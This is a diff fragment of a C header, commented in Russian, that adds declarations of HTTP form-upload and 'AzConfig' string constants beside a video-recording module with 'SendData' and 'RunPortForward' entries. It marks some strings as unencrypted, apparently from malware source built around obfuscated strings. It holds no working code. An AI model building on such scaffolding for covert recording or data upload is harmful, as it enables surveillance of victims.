@@ -45,9 +45,22 @@ extern CSSTR VideRecFuncSendData[];
 extern CSSTR VideRecFuncRunPortForward[];
 
 
+// Константы модуля HTTP
+extern CSSTR HTTPFormContentDisposition[];
+extern CSSTR HTTPFormFieldName[]; // Шаблон формирования имени поля
+extern CSSTR HTTPFormFileInfo[];  // Шаблон строки формирования информации о имени файла при отправке формы
+extern CSSTR HTTPOctetStream[];
+
+
+// Строки модуля AzConfig
+extern CSSTR AzConfigParamUserName[];
+
+
+
 //Не шифрованные строки и данные
 extern CSSTR Slash[];
 extern CSSTR SlashChar;
+
 
 
 
